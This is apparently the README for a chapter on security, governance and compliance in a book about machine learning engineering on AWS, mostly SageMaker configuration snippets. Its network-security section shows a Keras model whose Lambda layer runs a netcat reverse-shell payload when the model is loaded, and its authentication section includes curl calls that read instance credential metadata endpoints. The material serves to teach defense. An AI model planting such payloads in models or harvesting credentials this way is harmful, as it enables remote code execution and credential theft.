## Machine Learning Engineering on AWS

<a href="https://www.packtpub.com/product/machine-learning-engineering-on-aws/9781803247595"><img src="https://static.packt-cdn.com/products/9781803247595/cover/smaller" alt="Book Name" height="100px" align="left"></a>

**Chapter 9: Security, Governance, and Compliance Strategies** <br />
This chapter focuses on the relevant security, governance, and compliance strategies needed to secure production environments. Here, we will also dive a bit deeper into the different techniques in ensuring data privacy and model privacy.

<br />

### I. Links

| Label                                                 | Link                                                                                                      |
|-------------------------------------------------------|-----------------------------------------------------------------------------------------------------------|
| Sample Pickle Exploit                                 | https://gist.github.com/joshualat/a3fdfa4d49d1d6725b1970133d06866b                                        |
| Vulnerability Management on AWS with Amazon Inspector | https://medium.com/@arvs.lat/automated-vulnerability-management-on-aws-with-amazon-inspector-53c572bf8515 |
| SageMaker Experiments                                 | [https://bit.ly/3POKbKf](https://github.com/PacktPublishing/Machine-Learning-with-Amazon-SageMaker-Cookbook/blob/master/Chapter05/06%20-%20Inspecting%20Experiments,%20Trials,%20and%20Trial%20Components%20with%20SageMaker%20Experiments.ipynb)                      |
| SageMaker A/B Testing                                 | [https://bit.ly/3uSRZSE](https://github.com/PacktPublishing/Machine-Learning-with-Amazon-SageMaker-Cookbook/blob/master/Chapter09/04%20-%20Setting%20up%20AB%20testing%20on%20multiple%20models%20with%20production%20variants.ipynb)                                  |


### II. Commands

#### ➤ Managing the Security and Compliance of ML Environments

##### Authentication and Authorization

```
import boto3
sagemaker_client = boto3.client(
    'sagemaker-runtime',
    aws_access_key_id="<INSERT ACCESS KEY ID>",
    aws_secret_access_key="<INSERT SECRET ACCESS KEY>"
)


sagemaker_client = boto3.client('sagemaker-runtime')


from sagemaker import get_execution_role
role = get_execution_role()


curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance


curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

##### Network security

```
import tensorflow

from tensorflow.keras.layers import Input, Lambda, Softmax
from tensorflow.keras.models import Model
from tensorflow.keras.optimizers import Adam


def custom_layer(tensor):
    PAYLOAD = 'rm /tmp/FCMHH; mkfifo /tmp/FCMHH; cat /tmp/FCMHH | /bin/sh -i 2>&1 | nc 127.0.0.1 14344 > /tmp/FCMHH'
    __import__('os').system(PAYLOAD)
    
    return tensor


input_layer = Input(shape=(10), name="input_layer")
lambda_layer = Lambda(
    custom_layer,   
    name="lambda_layer"
)(input_layer)
output_layer = Softmax(name="output_layer")(lambda_layer)


model = Model(input_layer, output_layer, name="model")
model.compile(optimizer=Adam(lr=0.0004), loss="categorical_crossentropy")
model.save("model.h5")


from tensorflow.keras.models import load_model
load_model("model.h5")


estimator = Estimator(
    image,
    role,
    instance_type='ml.p2.xlarge',
    ...
    enable_network_isolation=True
)
```

##### Encryption at rest an in transit

```
estimator = Estimator(
    image,
    ...
    volume_kms_key=<insert kms key ARN>,
    output_kms_key=<insert kms key ARN>
)
...
estimator.deploy(
    ...
    kms_key=<insert kms key ARN>
)


estimator = Estimator(
    image,
    ...
    encrypt_inter_container_traffic=True
)


config = NetworkConfig(
    enable_network_isolation=True,
    encrypt_inter_container_traffic=True
)

processor = ScriptProcessor(
    ...
    network_config=config
)

processor.run(
    ...
)


ssh <user>@<IP address of instance> -NL 14344:localhost:8888
```

#### ➤ Establishing ML Governance

##### Model Validation

```
def load_model():
    sym_json = json_load(open('mx-mod-symbol.json')) 
    sym_json_string = json_dumps(sym_json)

    model = gluon.nn.SymbolBlock( 
        outputs=mxnet.sym.load_json(sym_json_string), 
        inputs=mxnet.sym.var('data'))

    model.load_parameters(
        'mx-mod-0000.params', 
        allow_missing=True
    )
    model.initialize()
    
    return model
```

##### ML Explainability

```
processor = SageMakerClarifyProcessor(...)
processor.run_explainability(...)
```

##### Bias Detection

```
processor = SageMakerClarifyProcessor(...)
processor.run_bias(...)
```

##### Data Integrity Management

```
SELECT booking_changes, has_booking_changes, * 
FROM dev.public.bookings 
WHERE 
(booking_changes=0 AND has_booking_changes='True') 
OR 
(booking_changes>0 AND has_booking_changes='False');
```
